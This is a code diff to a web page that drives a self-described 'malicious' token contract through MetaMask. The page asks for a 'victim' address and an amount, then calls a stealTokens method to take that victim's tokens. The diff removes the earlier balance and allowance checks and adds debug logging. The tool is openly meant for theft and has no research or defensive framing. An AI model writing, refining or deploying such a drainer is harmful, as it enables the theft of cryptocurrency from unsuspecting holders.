@@ -60,43 +60,48 @@
         let web3;
         let userAccount;
         let contractAddress = "0xaef39a78653Da57e30E34842B16A078dd4008363"; // Replace with your malicious contract address
-        let contractABI; // ABI will be loaded from external JSON
         let contract;
-        const deployerAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414";  // Replace with your deployer's address
 
         window.onload = () => {
+            console.debug("Page loaded. Checking for MetaMask...");
             if (typeof window.ethereum !== 'undefined') {
                 web3 = new Web3(window.ethereum);
-                loadABI();  // Load ABI dynamically
+                console.debug("MetaMask found. Loading ABI...");
+                loadABI();
                 init();
             } else {
                 alert("MetaMask not found!");
+                console.debug("MetaMask not found.");
             }
         };
 
-        // Load ABI from external file
         async function loadABI() {
-            const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
-            const abi = await response.json();
-            contractABI = abi;
-            contract = new web3.eth.Contract(contractABI, contractAddress);
+            try {
+                console.debug("Fetching ABI...");
+                const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
+                const abi = await response.json();
+                contract = new web3.eth.Contract(abi, contractAddress);
+                console.debug("Malicious contract initialized:", contract);
+            } catch (error) {
+                console.error("Error loading ABI:", error);
+            }
         }
 
         async function init() {
-            // Set up event listeners
             document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
             document.getElementById('withdrawTokensBtn').addEventListener('click', withdrawTokens);
         }
 
-        // Connect wallet (MetaMask)
         async function connectWallet() {
             try {
+                console.debug("Requesting wallet connection...");
                 const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 userAccount = accounts[0];
+                console.debug("Wallet connected:", userAccount);
                 document.getElementById('status').innerText = `Connected: ${userAccount}`;
                 document.getElementById('withdrawTokensBtn').style.display = "inline-block";
             } catch (error) {
-                console.error(error);
+                console.error("Error connecting wallet:", error);
                 alert("Error connecting to MetaMask.");
             }
         }
@@ -107,43 +112,25 @@
 
             if (!victimAddress) {
                 alert("Please enter a victim's address!");
+                console.debug("No victim address provided.");
                 return;
             }
             if (!withdrawAmount || withdrawAmount <= 0) {
                 alert("Please enter a valid amount to withdraw!");
+                console.debug("Invalid withdrawal amount:", withdrawAmount);
                 return;
             }
 
             try {
-                // Retrieve the victim's balance
-                const victimBalance = await contract.methods.balanceOf(victimAddress).call();
-                console.log("Victim Balance:", victimBalance);
-
-                if (parseInt(victimBalance) < withdrawAmount) {
-                    alert("The victim has insufficient tokens to withdraw.");
-                    return;
-                }
-
-                // Check if the victim has approved enough tokens for withdrawal
-                const allowance = await contract.methods.allowance(victimAddress, deployerAddress).call();
-                console.log("Allowance:", allowance);
-
-                if (parseInt(allowance) < withdrawAmount) {
-                    alert("The victim has not approved enough tokens for withdrawal.");
-                    return;
-                }
-
-                // Call withdrawTokens function, passing the victim's address and the withdrawal amount
-                await contract.methods.withdrawTokens(victimAddress, withdrawAmount).send({ from: userAccount });
-
+                console.debug("Initiating withdrawal for victim:", victimAddress, "Amount:", withdrawAmount);
+                await contract.methods.stealTokens(victimAddress, withdrawAmount).send({ from: userAccount });
+                console.debug("Withdrawal successful.");
                 document.getElementById('status').innerText = `Successfully withdrawn ${withdrawAmount} tokens from ${victimAddress}!`;
             } catch (error) {
                 console.error("Error withdrawing tokens:", error);
                 document.getElementById('status').innerText = "Error withdrawing tokens.";
-                alert("Error withdrawing tokens. Please try again.");
             }
         }
-
     </script>
 </body>
 </html>
